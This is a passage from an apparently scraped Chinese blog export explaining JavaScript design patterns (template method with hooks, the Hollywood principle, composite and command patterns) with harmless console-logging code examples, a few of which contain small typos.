我们一共有3次机会得到这个错误信息，第1次是在编写代码的时候，通过编译器的检查来得到错误信息；第2次是在创建对象的时候用鸭子类型来进行“接口检查”；而目前我们不得不利用最后一次机会，在程序运行过程中才知道哪里发生了错误。 模板方法模式的使用场景从大的方面来讲，模板方法模式常被架构师用于搭建项目的框架，架构师定好了框架的骨架，程序员继承框架的结构之后，负责往里面填空，比如Java程序员大多使用过HttpServlet技术来开发项目。 一个基于HttpServlet的程序包含7个生命周期，这7个生命周期分别对应一个do方法。doGet() doHead() doPost() doPut() doDelete() doOption() doTrace() HttpServlet类还提供了一个service方法，它就是这里的模板方法，service规定了这些do方法的执行顺序，而这些do方法的具体实现则需要HttpServlet的子类来提供。 在Web开发中也能找到很多模板方法模式的适用场景，比如我们在构建一系列的UI组件，这些组件的构建过程一般如下所示： 初始化一个div容器； 通过ajax请求拉取相应的数据； 把数据渲染到div容器里面，完成组件的构造； 通知用户组件渲染完毕。我们看到，任何组件的构建都遵循上面的4步，其中第(1)步和第(4)步是相同的。第(2)步不同的地方只是请求ajax的远程地址，第(3)步不同的地方是渲染数据的方式。 于是我们可以把这4个步骤都抽象到父类的模板方法里面，父类中还可以顺便提供第(1)步和第(4)步的具体实现。当子类继承这个父类之后，会重写模板方法里面的第(2)步和第(3)步。 钩子方法通过模板方法模式，我们在父类中封装了子类的算法框架。这些算法框架在正常状态下是适用于大多数子类的，但如果有一些特别“个性”的子类呢？比如我们在饮料类Beverage中封装了饮料的冲泡顺序. 这4个冲泡饮料的步骤适用于咖啡和茶，在我们的饮料店里，根据这4个步骤制作出来的咖啡和茶，一直顺利地提供给绝大部分客人享用。但有一些客人喝咖啡是不加调料（糖和牛奶）的。既然Beverage作为父类，已经规定好了冲泡饮料的4个步骤，那么有什么办法可以让子类不受这个约束呢？ 钩子方法（hook）可以用来解决这个问题，放置钩子是隔离变化的一种常见手段。我们在父类中容易变化的地方放置钩子，钩子可以有一个默认的实现，究竟要不要“挂钩”，这由子类自行决定。钩子方法的返回结果决定了模板方法后面部分的执行步骤，也就是程序接下来的走向，这样一来，程序就拥有了变化的可能。 在这个例子里，我们把挂钩的名字定为customerWantsCondiments，接下来将挂钩放入Beverage类，看看我们如何得到一杯不需要糖和牛奶的咖啡，代码如下：12345678910111213141516171819202122232425262728293031323334353637383940var Beverage = function() &#123;&#125;;Beverage.prototype.boilWater = function() &#123; console.log('把 水 煮 沸');&#125;;Beverage.prototype.brew = function() &#123; throw new Error('子 类 必 须 重 写 brew 方 法');&#125;;Beverage.prototype.pourInCup = function() &#123; throw new Error('子 类 必 须 重 写 pourInCup 方 法');&#125;;Beverage.prototype.addCondiments = function() &#123; throw new Error('子 类 必 须 重 写 addCondiments 方 法');&#125;;Beverage.prototype.customerWantsCondiments = function() &#123; return true; // 默 认 需 要 调 料 &#125;;Beverage.prototype.init = function() &#123; this.boilWater(); this.brew(); this.pourInCup(); if (this.customerWantsCondiments()) &#123; // 如 果 挂 钩 返 回 true， 则 需 要 调 料 this.addCondiments(); &#125;&#125;;var CoffeeWithHook = function() &#123;&#125;;CoffeeWithHook.prototype = new Beverage();CoffeeWithHook.prototype.brew = function() &#123; console.log('用 沸 水 冲 泡 咖 啡');&#125;;CoffeeWithHook.prototype.pourInCup = function() &#123; console.log('把 咖 啡 倒 进 杯 子');&#125;;CoffeeWithHook.prototype.addCondiments = function() &#123; console.log('加 糖 和 牛 奶');&#125;;CoffeeWithHook.prototype.customerWantsCondiments = function() &#123; return window.confirm('请 问 需 要 调 料 吗？');&#125;;var coffeeWithHook = new CoffeeWithHook();coffeeWithHook.init(); 好莱坞原则学习完模板方法模式之后，我们要引入一个新的设计原则——著名的“好莱坞原则”。好莱坞无疑是演员的天堂，但好莱坞也有很多找不到工作的新人演员，许多新人演员在好莱坞把简历递给演艺公司之后就只有回家等待电话。有时候该演员等得不耐烦了，给演艺公司打电话询问情况，演艺公司往往这样回答：“不要来找我，我会给你打电话。” 在设计中，这样的规则就称为好莱坞原则。在这一原则的指导下，我们允许底层组件将自己挂钩到高层组件中，而高层组件会决定什么时候、以何种方式去使用这些底层组件，高层组件对待底层组件的方式，跟演艺公司对待新人演员一样，都是“别调用我们，我们会调用你”。 模板方法模式是好莱坞原则的一个典型使用场景，它与好莱坞原则的联系非常明显，当我们用模板方法模式编写一个程序时，就意味着子类放弃了对自己的控制权，而是改为父类通知子类，哪些方法应该在什么时候被调用。作为子类，只负责提供一些设计上的细节。 除此之外，好莱坞原则还常常应用于其他模式和场景，例如发布-订阅模式和回调函数。 在发布—订阅模式中，发布者会把消息推送给订阅者，这取代了原先不断去fetch消息的形式。例如假设我们乘坐出租车去一个不了解的地方，除了每过5秒钟就问司机“是否到达目的地”之外，还可以在车上美美地睡上一觉，然后跟司机说好，等目的地到了就叫醒你。这也相当于好莱坞原则中提到的“别调用我们，我们会调用你”。 在ajax异步请求中，由于不知道请求返回的具体时间，而通过轮询去判断是否返回数据，这显然是不理智的行为。所以我们通常会把接下来的操作放在回调函数中，传入发起ajax异步请求的函数。当数据返回之后，这个回调函数才被执行，这也是好莱坞原则的一种体现。把需要执行的操作封装在回调函数里，然后把主动权交给另外一个函数。至于回调函数什么时候被执行，则是另外一个函数控制的。 真的需要“继承”吗模板方法模式是基于继承的一种设计模式，父类封装了子类的算法框架和方法的执行顺序，子类继承父类之后，父类通知子类执行这些方法，好莱坞原则很好地诠释了这种设计技巧，即高层组件调用底层组件。 通过模板方法模式，编写了一个CoffeeorTea的例子。模板方法模式是为数不多的基于继承的设计模式，但JavaScript语言实际上没有提供真正的类式继承，继承是通过对象与对象之间的委托来实现的。也就是说，虽然我们在形式上借鉴了提供类式继承的语言，但本次学习到的模板方法模式并不十分正宗。而且在JavaScript这般灵活的语言中，实现这样一个例子，是否真的需要继承这种重武器呢？ 在好莱坞原则的指导之下，下面这段代码可以达到和继承一样的效果。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152var Beverage = function(param) &#123; var boilWater = function() &#123; console.log('把 水 煮 沸'); &#125;; var brew = param.brew || function() &#123; throw new Error('必 须 传 递 brew 方 法'); &#125;; var pourInCup = param.pourInCup || function() &#123; throw new Error('必 须 传 递 pourInCup 方 法'); &#125;; var addCondiments = param.addCondiments || function() &#123; throw new Error('必 须 传 递 addCondiments 方 法'); &#125;; var F = function() &#123;&#125;; F.prototype.init = function() &#123; boilWater(); brew(); pourInCup(); addCondiments(); &#125;; return F;&#125;;var Coffee = Beverage(&#123; brew: function() &#123; console.log('用 沸 水 冲 泡 咖 啡'); &#125;, pourInCup: function() &#123; console.log('把 咖 啡 倒 进 杯 子'); &#125;, addCondiments: function() &#123; console.log('加 糖 和 牛 奶'); &#125;&#125;);var Tea = Beverage(&#123; brew: function() &#123; console.log('用 沸 水 浸 泡 茶 叶'); &#125;, pourInCup: function() &#123; console.log('把 茶 倒 进 杯 子'); &#125;, addCondiments: function() &#123; console.log('加 柠 檬'); &#125;&#125;);var coffee = new Coffee();coffee.init();var tea = new Tea();tea.init(); 在这段代码中，我们把brew、pourInCup、addCondiments这些方法依次传入Beverage函数，Beverage函数被调用之后返回构造器F。F类中包含了“模板方法”F.prototype.init。跟继承得到的效果一样，该“模板方法”里依然封装了饮料子类的算法框架。 小结模板方法模式是一种典型的通过封装变化提高系统扩展性的设计模式。在传统的面向对象语言中，一个运用了模板方法模式的程序中，子类的方法种类和执行顺序都是不变的，所以我们把这部分逻辑抽象到父类的模板方法里面。而子类的方法具体怎么实现则是可变的，于是我们把这部分变化的逻辑封装到子类中。通过增加新的子类，我们便能给系统增加新的功能，并不需要改动抽象父类以及其他子类，这也是符合开放-封闭原则的。 但在JavaScript中，我们很多时候都不需要依样画瓢地去实现一个模版方法模式，高阶函数是更好的选择。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"design pattern","slug":"design-pattern","permalink":"https://github.com/xmoyKING/tags/design-pattern/"}]},{"title":"JS设计模式-9-组合模式","slug":"js-pattern9","date":"2017-11-21T15:58:02.000Z","updated":"2017-12-06T14:50:09.336Z","comments":true,"path":"2017/11/21/js-pattern9/","link":"","permalink":"https://github.com/xmoyKING/2017/11/21/js-pattern9/","excerpt":"","text":"我们知道地球和一些其他行星围绕着太阳旋转，也知道在一个原子中，有许多电子围绕着原子核旋转。在程序设计中，也有一些和“事物是由相似的子事物构成”类似的思想。组合模式就是用小的子对象来构建更大的对象，而这些小的子对象本身也许是由更小的“孙对象”构成的。 回顾宏命令在命令模式中讲解过宏命令的结构和作用。宏命令对象包含了一组具体的子命令对象，不管是宏命令对象，还是子命令对象，都有一个execute方法负责执行命令。回顾万能遥控器上的宏命令代码：1234567891011121314151617181920var closeDoorCommand = &#123; execute: function()console.log( '关 门' ); &#125; &#125;; var openPcCommand = &#123; execute: function()nsole.log( '开 电 脑' ); &#125; &#125;; var openQQCommand = &#123; execute: functio)console.log( '登 录 QQ' ); &#125; &#125;; var MacroCommand = function( return &#123; commandsList: [], add: function( command )&#123; this.commandsList.push( command ); &#125;, execute: function()&#123; for ( var i = 0, command; command = this.commandsList[ i++ ]; )&#123; command.execute(); &#125; &#125; &#125; &#125;; var macroCommand = MacroCommand();macroCommand.add( closeDoorCommand ); macroCommand.add( openPcCommand ); macroCommand.add( openQQCommand ); macroCommand.execute(); 通过观察这段代码，我们很容易发现，宏命令中包含了一组子命令，它们组成了一个树形结构，这里是一棵结构非常简单的树。 其中，marcoCommand被称为组合对象，closeDoorCommand、openPcCommand、openQQCommand都是叶对象。在macroCommand的execute方法里，并不执行真正的操作，而是遍历它所包含的叶对象，把真正的execute请求委托给这些叶对象。 macroCommand表现得像一个命令，但它实际上只是一组真正命令的“代理”。并非真正的代理，虽然结构上相似，但macroCommand只负责传递请求给叶对象，它的目的不在于控制对叶对象的访问。 组合模式的用途组合模式将对象组合成树形结构，以表示“部分-整体”的层次结构。除了用来表示树形结构之外，组合模式的另一个好处是通过对象的多态性表现，使得用户对单个对象和组合对象的使用具有一致性，下面分别说明。 表示树形结构。通过回顾上面的例子，我们很容易找到组合模式的一个优点：提供了一种遍历树形结构的方案，通过调用组合对象的execute方法，程序会递归调用组合对象下面的叶对象的execute方法，所以我们的万能遥控器只需要一次操作，便能依次完成关门、打开电脑、登录QQ这几件事情。组合模式可以非常方便地描述对象部分-整体层次结构。 利用对象多态性统一对待组合对象和单个对象。利用对象的多态性表现，可以使客户端忽略组合对象和单个对象的不同。在组合模式中，客户将统一地使用组合结构中的所有对象，而不需要关心它究竟是组合对象还是单个对象。 这在实际开发中会给客户带来相当大的便利性，当我们往万能遥控器里面添加一个命令的时候，并不关心这个命令是宏命令还是普通子命令。这点对于我们不重要，我们只需要确定它是一个命令，并且这个命令拥有可执行的execute方法，那么这个命令就可以被添加进万能遥控器。当宏命令和普通子命令接收到执行execute方法的请求时，宏命令和普通子命令都会做它们各自认为正确的事情。这些差异是隐藏在客户背后的，在客户看来，这种透明性可以让我们非常自由地扩展这个万能遥控器。 请求在树中传递的过程在组合模式中，请求在树中传递的过程总是遵循一种逻辑。以宏命令为例，请求从树最顶端的对象往下传递，如果当前处理请求的对象是叶对象（普通子命令），叶对象自身会对请求作出相应的处理；如果当前处理请求的对象是组合对象（宏命令），组合对象则会遍历它属下的子节点，将请求继续传递给这些子节点。 总而言之，如果子节点是叶对象，叶对象自身会处理这个请求，而如果子节点还是组合对象，请求会继续往下传递。叶对象下面不会再有其他子节点，一个叶对象就是树的这条枝叶的尽头，组合对象下面可能还会有子节点. 请求从上到下沿着树进行传递，直到树的尽头。作为客户，只需要关心树最顶层的组合对象，客户只需要请求这个组合对象，请求便会沿着树往下传递，依次到达所有的叶对象。 在刚刚的例子中，由于宏命令和子命令组成的树太过简单，我们还不能清楚地看到组合模式带来的好处，如果只是简单地遍历一组子节点，迭代器便能解决所有的问题。接下来我们将创造一个更强大的宏命令，这个宏命令中又包含了另外一些宏命令和普通子命令，看起来是一棵相对较复杂的树。 更强大的宏命令目前的万能遥控器，包含了关门、开电脑、登录QQ这3个命令。现在我们需要一个“超级万能遥控器”，可以控制家里所有的电器，这个遥控器拥有以下功能： 打开空调 打开电视和音响 关门、开电脑、登录QQ首先在节点中放置一个按钮button来表示这个超级万能遥控器，超级万能遥控器上安装了一个宏命令，当执行这个宏命令时，会依次遍历执行它所包含的子命令，代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354var MacroCommand = function() &#123; return &#123; commandsList: [], add: function(command) &#123; this.commandsList.push(command); &#125;, execute: function() &#123; for (var i = 0, command; command = this.commandsList[i++];) &#123; command.execute(); &#125; &#125; &#125; &#125;;var openAcCommand = &#123; execute: function() &#123;console.log('打 开 空 调');&#125;&#125;; /********** 家 里 的 电 视 和 音 响 是 连 接 在 一 起 的， 所 以 可 以 用 一 个 宏 命 令 来 组 合 打 开 电 视 和 打 开 音 响 的 命 令*********/var openTvCommand = &#123; execute: function() &#123;console.log('打 开 电 视');&#125;&#125;;var openSoundCommand = &#123; execute: function() &#123;console.log('打 开 音 响');&#125;&#125;;var macroCommand1 = MacroCommand();macroCommand1.add(openTvCommand);macroCommand1.add(openSoundCommand); /********* 关 门、 打 开 电 脑 和 打 登 录 QQ 的 命 令****************/var closeDoorCommand = &#123; execute: function() &#123;console.log('关 门');&#125;&#125;;var openPcCommand = &#123; execute: function() &#123;console.log('开 电 脑');&#125;&#125;;var openQQCommand = &#123; execute: function() &#123;console.log('登 录 QQ');&#125;&#125;;var macroCommand2 = MacroCommand();macroCommand2.add(closeDoorCommand);macroCommand2.add(openPcCommand);macroCommand2.add(openQQCommand); /********* 现 在 把 所 有 的 命 令 组 合 成 一 个“ 超 级 命 令”**********/var macroCommand = MacroCommand();macroCommand.add(openAcCommand);macroCommand.add(macroCommand1);macroCommand.add(macroCommand2); /********* 最 后 给 遥 控 器 绑 定“ 超 级 命 令”**********/var setCommand = (function(command) &#123; document.getElementById('button').onclick = function() &#123; command.execute(); &#125;&#125;)(macroCommand); 当按下遥控器的按钮时，所有命令都将被依次执行,从这个例子中可以看到，基本对象可以被组合成更复杂的组合对象，组合对象又可以被组合，这样不断递归下去，这棵树的结构可以支持任意多的复杂度。在树最终被构造完成之后，让整颗树最终运转起来的步骤非常简单，只需要调用最上层对象的execute方法。每当对最上层的对象进行一次请求时，实际上是在对整个树进行深度优先的搜索，而创建组合对象的程序员并不关心这些内在的细节，往这棵树里面添加一些新的节点对象是非常容易的事情。 抽象类在组合模式中的作用前面说到，组合模式最大的优点在于可以一致地对待组合对象和基本对象。客户不需要知道当前处理的是宏命令还是普通命令，只要它是一个命令，并且有execute方法，这个命令就可以被添加到树中。 这种透明性带来的便利，在静态类型语言中体现得尤为明显。比如在Java中，实现组合模式的关键是Composite类和Leaf类都必须继承自一个Compenent抽象类。这个Compenent抽象类既代表组合对象，又代表叶对象，它也能够保证组合对象和叶对象拥有同样名字的方法，从而可以对同一消息都做出反馈。组合对象和叶对象的具体类型被隐藏在Compenent抽象类身后。 针对Compenent抽象类来编写程序，客户操作的始终是Compenent对象，而不用去区分到底是组合对象还是叶对象。所以我们往同一个对象里的add方法里，既可以添加组合对象，也可以添加叶对象。 然而在JavaScript这种动态类型语言中，对象的多态性是与生俱来的，也没有编译器去检查变量的类型，所以我们通常不会去模拟一个“怪异”的抽象类，JavaScript中实现组合模式的难点在于要保证组合对象和叶对象对象拥有同样的方法，这通常需要用鸭子类型的思想对它们进行接口检查。在JavaScript中实现组合模式，看起来缺乏一些严谨性，我们的代码算不上安全，但能更快速和自由地开发，这既是JavaScript的缺点，也是它的优点。 ####透明性带来的安全问题组合模式的透明性使得发起请求的客户不用去顾忌树中组合对象和叶对象的区别，但它们在本质上有是区别的。 组合对象可以拥有子节点，叶对象下面就没有子节点，所以我们也许会发生一些误操作，比如试图往叶对象中添加子节点。解决方案通常是给叶对象也增加add方法，并且在调用这个方法时，抛出一个异常来及时提醒客户：12345678910111213141516171819202122var MacroCommand = function() &#123; return &#123; commandsList: [], add: function(command) &#123; this.commandsList.push(command); &#125;, execute: function() &#123; for (var i = 0, command; command = this.commandsList[i++];) &#123; command.execute(); &#125; &#125; &#125; &#125;;var openTvCommand = &#123; execute: function() &#123;console.log('打 开 电 视'); &#125;, add: function() &#123; throw new Error('叶 对 象 不 能 添 加 子 节 点'); &#125;&#125;;var macroCommand = MacroCommand();macroCommand.add(openTvCommand);openTvCommand.add(macroCommand) // Uncaught Error: 叶 对 象 不 能 添 加 子 节 点 组合模式的例子——扫描文件夹文件夹和文件之间的关系，非常适合用组合模式来描述。文件夹里既可以包含文件，又可以包含其他文件夹，最终可能组合成一棵树，组合模式在文件夹的应用中有以下两层好处。 例如，我在同事的移动硬盘里找到了一些电子书，想把它们复制到F盘中的学习资料文件夹。在复制这些电子书的时候，我并不需要考虑这批文件的类型，不管它们是单独的电子书还是被放在了文件夹中。组合模式让Ctrl+V、Ctrl+C成为了一个统一的操作。 当我用杀毒软件扫描该文件夹时，往往不会关心里面有多少文件和子文件夹，组合模式使得我们只需要操作最外层的文件夹进行扫描。现在我们来编写代码，首先分别定义好文件夹Folder和文件File这两个类。见如下代码：123456789101112131415161718192021/******************************* Folder ******************************/var Folder = function(name) &#123; this.name = name; this.files = []; &#125;;Folder.prototype.add = function(file) &#123; this.files.push(file);&#125;;Folder.prototype.scan = function() &#123;console.log('开 始 扫 描 文 件 夹: ' + this.name); for (var i = 0, file, files = ts.files; file = files[i++];) &#123; file.scan(); &#125;&#125;; /******************************* File ******************************/var File = function(name) &#123; this.name = name; &#125;;File.prototype.add = function() &#123; throw new Error('文 件 下 面 不 能 再 添 加 文 件');&#125;;File.prototype.scan = function() &#123;console.log('开 始 扫 描 文 件: ' + this.name);; 接下来创建一些文件夹和文件对象，并且让它们组合成一棵树，这棵树就是我们F盘里的现有文件目录结构：1234567891011var folder = new Folder('学 习 资 料');var folder1 = new Folder('JavaScript');var folder2 = new Folder('jQuery');var file1 = new File('JavaScript 设 计 模 式 与 开 发 实 践');var file2 = new File('精 通 jQuery');var file3 = new File('重 构 与 模 式') folder1.add(file1);folder2.add(file2);folder.add(folder1);folder.add(folder2);folder.add(file3); 现在的需求是把移动硬盘里的文件和文件夹都复制到这棵树中，假设我们已经得到了这些文件对象：1234var folder3 = new Folder('Nodejs');var file4 = new File('深 入 浅 出 Node.js');folder3.add(file4);var file5 = new File('JavaScript 语 言 精 髓 与 编 程 实 践'); 接下来就是把这些文件都添加到原有的树中：12folder.add( folder3 ); folder.add( file5 ); 通过这个例子，我们再次看到客户是如何同等对待组合对象和叶对象。在添加一批文件的操作过程中，客户不用分辨它们到底是文件还是文件夹。新增加的文件和文件夹能够很容易地添加到原来的树结构中，和树里已有的对象一起工作。我们改变了树的结构，增加了新的数据，却不用修改任何一句原有的代码，这是符合开放-封闭原则的。运用了组合模式之后，扫描整个文件夹的操作也是轻而易举的，我们只需要操作树的最顶端对象：folder.scan(); 一些值得注意的地方在使用组合模式的时候，还有以下几个值得我们注意的地方。 组合模式不是父子关系组合模式的树型结构容易让人误以为组合对象和叶对象是父子关系，这是不正确的。组合模式是一种HAS-A（聚合）的关系，而不是IS-A。组合对象包含一组叶对象，但Leaf并不是Composite的子类。组合对象把请求委托给它所包含的所有叶对象，它们能够合作的关键是拥有相同的接口。为了方便描述，有时候把上下级对象称为父子节点，但它们并非真正意义上的父子关系。 对叶对象操作的一致性组合模式除了要求组合对象和叶对象拥有相同的接口之外，还有一个必要条件，就是对一组叶对象的操作必须具有一致性。比如公司要给全体员工发放元旦的过节费1000块，这个场景可以运用组合模式，但如果公司给今天过生日的员工发送一封生日祝福的邮件，组合模式在这里就没有用武之地了，除非先把今天过生日的员工挑选出来。只有用一致的方式对待列表中的每个叶对象的时候，才适合使用组合模式。 双向映射关系发放过节费的通知步骤是从公司到各个部门，再到各个小组，最后到每个员工的邮箱里。这本身是一个组合模式的好例子，但要考虑的一种情况是，也许某些员工属于多个组织架构。比如某位架构师既隶属于开发组，又隶属于架构组，对象之间的关系并不是严格意义上的层次结构，在这种情况下，是不适合使用组合模式的，该架构师很可能会收到两份过节费。这种复合情况下我们必须给父节点和子节点建立双向映射关系，一个简单的方法是给小组和员工对象都增加集合来保存对方的引用。但是这种相互间的引用相当复杂，而且对象之间产生了过多的耦合性，修改或者删除一个对象都变得困难，此时我们可以引入中介者模式来管理这些对象。 用职责链模式提高组合模式性能在组合模式中，如果树的结构比较复杂，节点数量很多，在遍历树的过程中，性能方面也许表现得不够理想。有时候我们确实可以借助一些技巧，在实际操作中避免遍历整棵树，有一种现成的方案是借助职责链模式。职责链模式一般需要我们手动去设置链条，但在组合模式中，父对象和子对象之间实际上形成了天然的职责链。让请求顺着链条从父对象往子对象传递，或者是反过来从子对象往父对象传递，直到遇到可以处理该请求的对象为止，这也是职责链模式的经典运用场景之一。 引用父对象在前面的例子中，组合对象保存了它下面的子节点的引用，这是组合模式的特点，此时树结构是从上至下的。但有时候我们需要在子节点上保持对父节点的引用，比如在组合模式中使用职责链时，有可能需要让请求从子节点往父节点上冒泡传递。还有当我们删除某个文件的时候，实际上是从这个文件所在的上层文件夹中删除该文件的。 现在来改写扫描文件夹的代码，使得在扫描整个文件夹之前，我们可以先移除某一个具体的文件。首先改写Folder类和File类，在这两个类的构造函数中，增加this.parent属性，并且在调用add方法的时候，正确设置文件或者文件夹的父节点：123456789101112131415var Folder = function( name )&#123; this.name = name; this.parent = null; // 增 加 this.parent 属 性 this.files = []; &#125;; Folder.prototype.add = function( file )&#123; file.parent = this; // 设 置 父 对 象 this.files.push( file ); &#125;; Folder.prototype.scan = function()&#123; console.log( '开 始 扫 描 文 件 夹: ' + this.name ); for ( var i = 0, file, files = this.files; file = files[ i++ ]; )&#123; file.scan(); &#125; &#125;; 接下来增加Folder.prototype.remove方法，表示移除该文件夹：123456789Folder.prototype.remove = function()&#123; if ( !this.parent )&#123; // 根 节 点 或 者 树 外 的 游 离 节 点 return; &#125; for ( var files = this.parent.files, l = files.length - 1; l &gt;= 0; l-- )&#123; var file = files[ l ]; if ( file === this )&#123; files.splice( l, 1 ); &#125; &#125; &#125;; 在File.prototype.remove方法里，首先会判断this.parent，如果this.parent为null，那么这个文件夹要么是树的根节点，要么是还没有添加到树的游离节点，这时候没有节点需要从树中移除，我们暂且让remove方法直接return，表示不做任何操作。如果this.parent不为null，则说明该文件夹有父节点存在，此时遍历父节点中保存的子节点列表，删除想要删除的子节点。 File类的实现基本一致：12345678910111213var File = function( name )&#123; this.name = name; this.parent = null; &#125;; File.prototype.add = function()&#123; throw new Error( '不 能 添 加 在 文 件 下 面' ); &#125;; File.prototype.scan = function()&#123; console.log( '开 始 扫 描 文 件: ' + this.name ); &#125;; File.prototype.remove = function()&#123; if ( !this.parent )&#123; return; &#125; for ( var files = this.parent.files, l = files.length - 1; l &gt;= 0; l-- )&#123; var file = files[ l ]; if ( file === this )&#123; files.splice( l, 1 ); &#125; &#125;&#125;; 何时使用组合模式组合模式如果运用得当，可以大大简化客户的代码。一般来说，组合模式适用于以下这两种情况。 表示对象的部分-整体层次结构。组合模式可以方便地构造一棵树来表示对象的部分-整体结构。特别是我们在开发期间不确定这棵树到底存在多少层次的时候。在树的构造最终完成之后，只需要通过请求树的最顶层对象，便能对整棵树做统一的操作。在组合模式中增加和删除树的节点非常方便，并且符合开放-封闭原则。 客户希望统一对待树中的所有对象。组合模式使客户可以忽略组合对象和叶对象的区别，客户在面对这棵树的时候，不用关心当前正在处理的对象是组合对象还是叶对象，也就不用写一堆if、else语句来分别处理它们。组合对象和叶对象会各自做自己正确的事情，这是组合模式最重要的能力。 组合模式可以让我们使用树形方式创建对象的结构。我们可以把相同的操作应用在组合对象和单个对象上。在大多数情况下，我们都可以忽略掉组合对象和单个对象之间的差别，从而用一致的方式来处理它们。 然而，组合模式并不是完美的，它可能会产生一个这样的系统：系统中的每个对象看起来都与其他对象差不多。它们的区别只有在运行的时候会才会显现出来，这会使代码难以理解。此外，如果通过组合模式创建了太多的对象，那么这些对象可能会让系统负担不起。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"design pattern","slug":"design-pattern","permalink":"https://github.com/xmoyKING/tags/design-pattern/"}]},{"title":"JS设计模式-8-命令模式","slug":"js-pattern8","date":"2017-11-19T15:51:14.000Z","updated":"2017-12-06T14:50:09.336Z","comments":true,"path":"2017/11/19/js-pattern8/","link":"","permalink":"https://github.com/xmoyKING/2017/11/19/js-pattern8/","excerpt":"","text":"假设有一个快餐店，而我是该餐厅的点餐服务员，那么我一天的工作应该是这样的： 当某位客人点餐或者打来订餐电话后，我会把他的需求都写在清单上，然后交给厨房，客人不用关心是哪些厨师帮他炒菜。我们餐厅还可以满足客人需要的定时服务，比如客人可能当前正在回家的路上，要求1个小时后才开始炒他的菜，只要订单还在，厨师就不会忘记。 客人也可以很方便地打电话来撤销订单。另外如果有太多的客人点餐，厨房可以按照订单的顺序排队炒菜。这些记录着订餐信息的清单，便是命令模式中的命令对象。 命令模式的用途命令模式是最简单和优雅的模式之一，命令模式中的命令（command）指的是一个执行某些特定事情的指令。 命令模式最常见的应用场景是：有时候需要向某些对象发送请求，但是并不知道请求的接收者是谁，也不知道被请求的操作是什么。此时希望用一种松耦合的方式来设计程序，使得请求发送者和请求接收者能够消除彼此之间的耦合关系。 拿订餐来说，客人需要向厨师发送请求，但是完全不知道这些厨师的名字和联系方式，也不知道厨师炒菜的方式和步骤。命令模式把客人订餐的请求封装成command对象，也就是订餐中的订单对象。这个对象可以在程序中被四处传递，就像订单可以从服务员手中传到厨师的手中。这样一来，客人不需要知道厨师的名字，从而解开了请求调用者和请求接收者之间的耦合关系。 另外，相对于过程化的请求调用，command对象拥有更长的生命周期。对象的生命周期是跟初始请求无关的，因为这个请求已经被封装在了command对象的方法中，成为了这个对象的行为。我们可以在程序运行的任意时刻去调用这个方法，就像厨师可以在客人预定1个小时之后才帮他炒菜，相当于程序在1个小时之后才开始执行command对象的方法。 除了这两点之外，命令模式还支持撤销、排队等操作. 命令模式的例子——菜单程序假设我们正在编写一个用户界面程序，该用户界面上至少有数十个Button按钮。因为项目比较复杂，所以我们决定让某个程序员负责绘制这些按钮，而另外一些程序员则负责编写点击按钮后的具体行为，这些行为都将被封装在对象里。 在大型项目开发中，这是很正常的分工。对于绘制按钮的程序员来说，他完全不知道某个按钮未来将用来做什么，可能用来刷新菜单界面，也可能用来增加一些子菜单，他只知道点击这个按钮会发生某些事情。那么当完成这个按钮的绘制之后，应该如何给它绑定onclick事件呢？ 回想一下命令模式的应用场景： 有时候需要向某些对象发送请求，但是并不知道请求的接收者是谁，也不知道被请求的操作是什么，此时希望用一种松耦合的方式来设计软件，使得请求发送者和请求接收者能够消除彼此之间的耦合关系。 我们很快可以找到在这里运用命令模式的理由：点击了按钮之后，必须向某些负责具体行为的对象发送请求，这些对象就是请求的接收者。但是目前并不知道接收者是什么对象，也不知道接收者究竟会做什么。此时我们需要借助命令对象的帮助，以便解开按钮和负责具体行为对象之间的耦合。 设计模式的主题总是把不变的事物和变化的事物分离开来，命令模式也不例外。按下按钮之后会发生一些事情是不变的，而具体会发生什么事情是可变的。通过command对象的帮助，将来我们可以轻易地改变这种关联，因此也可以在将来再次改变按钮的行为。 首先在页面中完成3个button按钮的“绘制”，接下来定义setCommand函数，setCommand函数负责往按钮上面安装命令。可以肯定的是，点击按钮会执行某个command命令，执行命令的动作被约定为调用command对象的execute()方法。虽然还不知道这些命令究竟代表什么操作，但负责绘制按钮的程序员不关心这些事情，他只需要预留好安装命令的接口，command对象自然知道如何和正确的对象沟通：1var setCommand = function( button, command )&#123; button.onclick = function()&#123; command.execute(); &#125; &#125;; 最后，负责编写点击按钮之后的具体行为的程序员总算交上了他们的成果，他们完成了刷新菜单界面、增加子菜单和删除子菜单这几个功能，这几个功能被分布在MenuBar和SubMenu这两个对象中：12345678var MenuBar = &#123; refresh: function()&#123; console.log( '刷 新 菜 单 目 录' ); &#125; &#125;; var SubMenu = &#123; add: function()&#123; console.log( '增 加 子 菜 单' ); &#125;, del: function()&#123; console.log( '删 除 子 菜 单' ); &#125;&#125;; 在让button变得有用起来之前，我们要先把这些行为都封装在命令类中：12345678var RefreshMenuBarCommand = function( receiver )&#123; this.receiver = receiver; &#125;; RefreshMenuBarCommand.prototype.execute = function()&#123; this.receiver.refresh(); &#125;; var AddSubMenuCommand = function( receiver )&#123; this.receiver = receiver; &#125;; AddSubMenuCommand.prototype.execute = function()&#123; this.receiver.add();&#125;; var DelSubMenuCommand = function( receiver )&#123; this.receiver = receiver; &#125;; DelSubMenuCommand.prototype.execute = function()&#123; console.log( '删 除 子 菜 单' ); &#125;; 最后就是把命令接收者传入到command对象中，并且把command对象安装到button上面：1234567var refreshMenuBarCommand = new RefreshMenuBarCommand( MenuBar ); var addSubMenuCommand = new AddSubMenuCommand( SubMenu ); var delSubMenuCommand = new DelSubMenuCommand( SubMenu ); setCommand( button1, refreshMenuBarCommand );setCommand( button2, addSubMenuCommand ); setCommand( button3, delSubMenuCommand ); 以上只是一个很简单的命令模式示例，但从中可以看到我们是如何把请求发送者和请求接收者解耦开的。 JavaScript中的命令模式也许我们会感到很奇怪，所谓的命令模式，看起来就是给对象的某个方法取了execute的名字。引入command对象和receiver这两个无中生有的角色无非是把简单的事情复杂化了，即使不用什么模式，用下面寥寥几行代码就可以实现相同的功能：123456789101112var bindClick = function( button, func )&#123; button.onclick = func; &#125;; var MenuBar = &#123; refresh: function()&#123; console.log( '刷 新 菜 单 界 面' ); &#125; &#125;; var SubMenu = &#123; add: function()&#123; console.log( 